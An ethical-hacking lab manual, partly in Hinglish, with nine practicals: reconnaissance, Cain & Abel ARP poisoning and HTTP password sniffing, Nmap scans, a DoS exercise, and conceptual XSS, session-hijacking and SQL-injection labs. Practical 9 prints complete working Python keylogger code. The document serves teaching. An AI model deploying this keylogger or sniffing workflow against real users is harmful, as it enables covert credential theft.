---

# PRACTICAL NO 1

## AIM :- Google and Whois Reconnaissance

- Use Google search techniques to gather information about a specific target or organization.
- Utilize advanced search operators to refine search results and access hidden information.
- Perform Whois lookups to retrieve domain registration information and gather details about the target's infrastructure.

---

## SOLUTION :-
STEP 1 :- Search “Prestashop” on google and take a screenshot of panel containing PrestaShop information.

STEP 2 :- Go to browser and search whois website.

STEP 3 :- Search for www.prestashop.com

STEP 4 :- Scroll down and study the information given below.

STEP 5 :- Click on DNS Records.

STEP 6 :- Click on Diagnostics.

## OUTPUT :-
- Google dorking / search operators ka use karke public information gather ki.
- Whois lookup se domain registration + DNS related details study ki.

---

# PRACTICAL NO 2

## AIM :- Password Encryption and Cracking with CrypTool and Cain and Abel

- Password Encryption and Decryption:
  - Use CrypTool to encrypt passwords using the RC4 algorithm.
  - Decrypt the encrypted passwords and verify the original values.

- Password Cracking and Wireless Network Password Decoding:
  - Use Cain and Abel to perform a dictionary attack on Windows account passwords.
  - Decode wireless network passwords using Cain and Abel's capabilities.

---

## SOLUTION :-

### Use CrypTool
1. Create one Text file and save.
2. Go to Encrypt/Decrypt → Symmetric(modern) → RC4.
3. In Key Length Select 16 bits and click on Encrypt.
4. After Clicking Encrypt you will get the converted message. Save the message somewhere on your desktop.
5. For Decryption select the file and repeat the same procedure.
6. After Clicking Decrypt you will get the real message.

### Use Cain & Abel Tool
1. Download, Install and then Open the Cain & Abel Tool.
2. Go to Sniffer and then click on configure, select the appropriate wireless adapter. Click on apply and then click on the OK button.
3. Activate Sniffer.
4. Click on + Icon. Check All Tests checkbox and then click on OK.
5. It will Display All Hosts.
6. Click on ARP then click on the blank screen and then on the + Icon. Select any IP Address.
7. Select all IP Address and Mac Addresses and then click on OK.
8. Select Start/Stop ARP.
9. Click on Passwords and go to http for user login session information.

## OUTPUT :-
- RC4 encryption/decryption ka practical complete hua.
- Cain & Abel me sniffer/host discovery/ARP related workflow observe kiya.

---

# PRACTICAL NO 3

## AIM :- Linux Network Analysis and ARP Poisoning

- Linux Network Analysis:
  - Execute the ifconfig command to retrieve network interface information.
  - Use the ping command to test network connectivity and analyze the output.
  - Analyze the netstat command output to view active network connections.
  - Perform a traceroute to trace the route packets take to reach a target host.

- ARP Poisoning:
  - Use ARP poisoning techniques to redirect network traffic on a Windows system.
  - Analyze the effects of ARP poisoning on network communication and security.

---

## SOLUTION :-

# Network Analysis Commands (Linux vs Windows)

| Tool                    | Linux Command             | Windows Command        |
| ----------------------- | ---------------------     | ------------------     |
| Interface Configuration | ifconfig or ip addr       | ipconfig               |
| Ping                    | ping www.google.com       | ping www.google.com    |
| Netstat                 | netstat -tuln             | netstat -an            |
| Traceroute              | traceroute www.google.com | tracert www.google.com |


### Use Cain & Abel Tool (ARP / Sniffer Observation)
1. Download, Install and then Open the Cain & Abel Tool.
2. Go to Sniffer and then click on configure, select the appropriate wireless adapter. Click on apply and then click on the OK button.
3. Activate Sniffer.
4. Click on + Icon. Check All Tests checkbox and then click on OK.
5. It will Display All Hosts.
6. Click on ARP then click on the blank screen and then on the + Icon. Select any IP Address.
7. Select all IP Address and Mac Addresses and then click on OK.
8. Select Start/Stop ARP.
9. Click on Passwords and go to http for user login session information.

## OUTPUT :-
- Linux commands ka output analyze kiya.
- ARP related behavior aur security impact (conceptually) observe kiya.

---

# PRACTICAL NO 4

## AIM :- Port Scanning with NMap

- Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered, or open.
- Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their characteristics.
- Analyze the scan results to gather information about the target system's network services.

---

## SOLUTION :-
1. ACK scan (TCP ACK scan) performed.
2. SYN (Stealth) scan performed.
3. FIN scan performed.
4. NULL scan performed.
5. XMAS scan performed.

## OUTPUT :-
- Different scan types ka behavior samjha.
- Target ke open/filtered ports ka analysis kiya.

---

# PRACTICAL NO 5

## AIM :- Network Traffic Capture and DoS Attack with Wireshark and Nemesy

- Network Traffic Capture:
  - Use Wireshark to capture network traffic on a specific network interface.
  - Analyze captured packets to extract relevant information.

- Denial of Service (DoS) Attack:
  - Use a DoS tool to generate high traffic (only in controlled lab).
  - Observe impact on target availability/performance.

---

## SOLUTION :-

### a) Network Traffic Capture
1. Open WireShark.
2. Select Connection and capture network packets on that connection.
3. Open a test login page and perform login using test credentials (lab environment).
4. In WireShark, apply filters for GET requests.
5. Apply filters for POST requests and observe form data fields.

### b) Denial of Service (DoS) Attack (LAB ONLY)
1. Perform DoS demonstration only in a controlled lab setup.
2. Send high-volume traffic to observe performance degradation.
3. Observe packets in Wireshark and note impact.

## OUTPUT :-
- HTTP GET/POST traffic capture karke analysis kiya.
- DoS ka impact (availability/performance) lab me observe kiya.

---

# PRACTICAL NO 6

## AIM :- Persistent Cross-Site Scripting Attack

- Set up a vulnerable web application that is susceptible to persistent XSS attacks.
- Craft a script to understand stored XSS behavior (lab only).
- Observe consequences and understand risks.

---

## SOLUTION :-
1. Set up a vulnerable web application in local lab environment.
2. Configure the application and login with default admin credentials (lab).
3. Set security level to low (lab).
4. Navigate to Stored XSS section and test stored input behavior.
5. Observe alert/script execution effect in controlled environment.

## OUTPUT :-
- Stored XSS ka concept samjha.
- Input validation/output encoding ki importance observe ki.

---

# PRACTICAL NO 7

## AIM :- Session Impersonation with Firefox and Tamper Data

- Install and configure Tamper Data add-on in Firefox.
- Intercept and modify HTTP requests to understand session handling risks (lab only).
- Understand impact of session impersonation and importance of session management.

---

## SOLUTION :-
1. Install required browser extensions (lab).
2. Login to a test web application (lab).
3. Observe cookies/session identifiers behavior.
4. Intercept requests and study how session values affect authentication (lab).
5. Document secure session management practices.

## OUTPUT :-
- Session management ka concept aur risks samjhe.
- Cookies/Session IDs ke through authentication behavior observe kiya.

---

# PRACTICAL NO 8

## AIM :- SQL Injection Attack

- Identify a web application vulnerable to SQL injection (lab).
- Craft and execute test inputs to understand SQLi impact (lab).
- Extract/observe how insecure queries can expose data.

---

## SOLUTION :-
1. Set up a vulnerable web application in lab.
2. Set security level low (lab).
3. Go to SQL Injection module.
4. Test normal inputs and observe output.
5. Study how unsafe inputs can change database query behavior.
6. Note down prevention methods: parameterized queries, validation.

## OUTPUT :-
- SQLi vulnerability ka concept samjha.
- Secure coding practices note ki.

---

# PRACTICAL NO 9

## AIM :- Creating a Keylogger with Python

- Understand how keystrokes can be captured and logged (education/lab only).
- Observe logging concept and associated security risks.
- Learn how to protect systems against keyloggers.

---

```Python
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                log.write(" ")
            else:
                log.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

```

## OUTPUT :-
- Keylogger ke risks aur defensive measures samjhe.
- System protection best practices note ki.
---
